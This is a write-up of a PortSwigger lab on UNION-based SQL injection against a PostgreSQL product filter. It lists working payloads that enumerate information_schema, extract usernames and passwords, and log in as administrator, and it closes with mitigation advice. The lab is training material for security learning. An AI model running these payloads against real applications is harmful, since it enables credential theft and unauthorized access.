# SQL Injection – UNION Attack: Enumerating Users Table

## 🧪 Lab

PortSwigger Web Security Academy – SQL Injection

**Lab:** SQL injection UNION attack, retrieving data from other tables

**Category:** SQL Injection

**Difficulty:** Apprentice

---

## 🎯 Objective

The application contains a SQL injection vulnerability in the product category filter.

The objective was to:

1. Identify the number of columns returned by the original query.
2. Determine which column is reflected in the application response.
3. Enumerate the database tables.
4. Identify the table containing user credentials.
5. Determine the names of the username and password columns.
6. Retrieve the credentials.
7. Log in as the administrator user.

---

## 🔎 1. Identifying the UNION Structure

The first step was to determine whether a `UNION SELECT` could be used and which column was reflected in the response.

The following payload was used:

```text
Pets'union select 'test',NULL-- -
```

The string `test` appeared in the application response.

This confirmed that:

- The injection point was vulnerable to SQL injection.
- The query accepted a `UNION SELECT`.
- The UNION contained two columns.
- The first column was reflected in the response.

---

## 🗂️ 2. Enumerating Database Tables

Since the objective was to retrieve credentials from another table, the next step was to enumerate the available tables through PostgreSQL's `information_schema`.

Payload:

```text
Pets'union+select+table_name,NULL+from+information_schema.tables--+-
```

The response contained several database objects.

Among them was the following table:

```text
users_dxvuoo
```

This appeared to be the application's user table and was therefore selected for further enumeration.

---

## 🧱 3. Enumerating the Columns

The next step was to determine which columns existed inside `users_dxvuoo`.

Payload:

```text
Pets'union+select+column_name,NULL+from+information_schema.columns+where+table_name='users_dxvuoo'--+-
```

The application returned the following relevant columns:

```text
username_tmvlul
password_fjojeu
```

Therefore, the table structure relevant to the lab was:

| Column | Purpose |
|---|---|
| `username_tmvlul` | Username |
| `password_fjojeu` | Password |

---

## 🔐 4. Retrieving Usernames

The username column was queried first:

```text
Pets'union+select+username_tmvlul,NULL+from+users_dxvuoo--+-
```

This returned the usernames stored in the table, including the administrator account.

---

## 🔑 5. Retrieving Passwords

The password column was then queried:

```text
Pets'union+select+password_fjojeu,NULL+from+users_dxvuoo--+-
```

This returned the passwords associated with the users.

The credentials could then be used to authenticate as the administrator.

---

## 🧩 6. Retrieving Username and Password Together

Because the backend was PostgreSQL, string concatenation could also be used to retrieve both values in the same reflected column.

Payload:

```text
Pets'union+select+username_tmvlul||':'||password_fjojeu,NULL+from+users_dxvuoo--+-
```

The response returned the credentials in the following format:

```text
username:password
```

This made it possible to identify the administrator credentials required to complete the lab.

> Credentials obtained during the lab are intentionally not documented here.

---

## 🏁 7. Authentication

Using the administrator credentials obtained through the SQL injection, it was possible to log into the application's administrator account.

The PortSwigger lab was successfully completed.

---

## 🧠 Key Takeaways

This lab demonstrated a complete UNION-based SQL injection workflow.

The main techniques used were:

- Identifying the number of columns.
- Identifying reflected columns.
- Querying `information_schema.tables`.
- Enumerating columns through `information_schema.columns`.
- Identifying an application-specific users table.
- Extracting usernames and passwords.
- Using PostgreSQL string concatenation.
- Using the retrieved credentials to authenticate as an administrator.

---

## 🛡️ Mitigation

The vulnerability can be prevented by avoiding the construction of SQL queries using untrusted user input.

Recommended protections include:

- Use parameterized queries / prepared statements.
- Never concatenate user-controlled input directly into SQL queries.
- Apply appropriate input validation.
- Use database accounts with the minimum required privileges.
- Avoid exposing detailed database errors to users.
- Perform regular security testing of application input points.

---

## 📚 References

- PortSwigger Web Security Academy – SQL Injection
- PostgreSQL `information_schema`
